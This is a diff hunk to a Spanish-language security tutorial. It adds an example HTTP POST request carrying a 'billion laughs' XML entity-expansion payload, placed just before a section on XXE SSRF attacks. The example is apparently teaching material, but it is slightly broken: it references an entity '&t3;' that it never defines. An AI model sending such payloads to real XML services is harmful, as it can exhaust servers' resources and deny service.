@@ -1065,6 +1065,22 @@ Ahora vamos a ver como en base a esto podemos hacer el ataque `billion laughs at
 | John John John John John John John John John John John John John John        |
 ```
 
+|                      Request                      |
+|---------------------------------------------------|
+| ```POST http://example.com/xml HTTP/1.1              |
+|                                                   |
+| <?xml version="1.0" encoding="ISO-8859-1"?>       |
+| <!DOCTYPE mytype [                                |
+| <!ELEMENT mytype ANY>                             |
+| <!ENTITY name "John ">                            |
+| <!ENTITY name2 "&name;&name;">                    |
+| <!ENTITY name3 "&name2;&name2;&name2;&name2;">    |
+| <!ENTITY name4 "&name3;&name3;&name3;&name3;">]>  |
+| <foo>                                             |
+| Hello &t3;                                        |
+| </foo>           ```                                 |
+
+
 ### XXE SSRF Attack
 
 
